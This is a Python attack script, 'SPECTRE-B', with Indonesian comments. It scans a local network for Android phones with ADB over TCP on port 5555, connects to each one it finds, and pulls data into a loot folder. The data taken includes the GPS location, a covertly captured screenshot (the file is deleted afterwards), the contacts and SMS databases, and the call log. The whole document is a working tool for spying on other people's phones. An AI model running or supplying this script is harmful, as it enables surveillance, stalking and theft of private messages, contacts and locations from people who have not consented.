#!/usr/bin/env python3
# SPECTRE-B: ADB Network Scanner — cari HP dengan TCP ADB aktif
# Port 5555 = ADB over WiFi/network
# Butuh: adb di PATH
import subprocess, socket, threading, ipaddress, os, sys
from datetime import datetime

LOOT = "spectre_loot"
os.makedirs(LOOT, exist_ok=True)

found = []
lock  = threading.Lock()

def adb(device, *args):
    r = subprocess.run(["adb", "-s", device] + list(args),
                       capture_output=True, text=True, timeout=10)
    return (r.stdout + r.stderr).strip()

def check_host(ip, port=5555):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        if s.connect_ex((ip, port)) == 0:
            with lock: found.append(f"{ip}:{port}")
            print(f"  \033[92m[FOUND] {ip}:{port}\033[0m")
        s.close()
    except: pass

def get_local_subnet():
    import socket as sock
    try:
        s = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        return str(ipaddress.IPv4Network(ip + "/24", strict=False))
    except: return "192.168.1.0/24"

subnet = sys.argv[1] if len(sys.argv)>1 else get_local_subnet()
print(f"[SPECTRE-B] Scanning {subnet} for ADB TCP (port 5555)...")

threads = []
for ip in ipaddress.IPv4Network(subnet, strict=False).hosts():
    t = threading.Thread(target=check_host, args=(str(ip),), daemon=True)
    t.start(); threads.append(t)
for t in threads: t.join(timeout=2)

if not found:
    print("\n[!] No ADB TCP devices found.")
    print("    Pastikan target Android: Developer Options → ADB over WiFi ON")
    exit(0)

print(f"\n[+] {len(found)} device(s) found:")
for i, dev in enumerate(found):
    print(f"  [{i}] {dev}")

# Connect + auto-extract
for dev in found:
    print(f"\n[*] Connecting: {dev}")
    r = subprocess.run(["adb", "connect", dev], capture_output=True, text=True)
    print(f"  {r.stdout.strip()}")
    if "connected" in r.stdout or "already" in r.stdout:
        print(f"  [+] Connected! Grabbing data...")
        # Quick grab
        model   = adb(dev, "shell", "getprop ro.product.model")
        android = adb(dev, "shell", "getprop ro.build.version.release")
        user    = adb(dev, "shell", "whoami")
        gps     = adb(dev, "shell", "dumpsys location | grep -A2 'last known'")
        apps    = adb(dev, "shell", "pm list packages -3 | wc -l")
        print(f"  Model   : {model}")
        print(f"  Android : {android}")
        print(f"  User    : {user}")
        print(f"  GPS     : {gps[:100]}")
        print(f"  Apps    : {apps} third-party installed")

        safe_ip = dev.replace(":","_")
        loot_dev = f"{LOOT}/{safe_ip}"
        os.makedirs(loot_dev, exist_ok=True)

        # Screenshot
        adb(dev, "shell", "screencap -p /sdcard/.sp.png")
        adb(dev, "pull", "/sdcard/.sp.png", f"{loot_dev}/screenshot.png")
        adb(dev, "shell", "rm /sdcard/.sp.png")

        # Contacts + SMS
        adb(dev, "pull",
            "/data/data/com.android.providers.contacts/databases/contacts2.db",
            f"{loot_dev}/contacts2.db")
        adb(dev, "pull",
            "/data/data/com.android.providers.telephony/databases/mmssms.db",
            f"{loot_dev}/mmssms.db")

        # Call log
        calls = adb(dev, "shell", "content query --uri content://call_log/calls --projection number:duration:type:date | head -50")
        with open(f"{loot_dev}/calllog.txt","w") as f: f.write(calls)

        print(f"  [+] Loot saved: {loot_dev}/")

print(f"\n[SPECTRE-B] Done!")
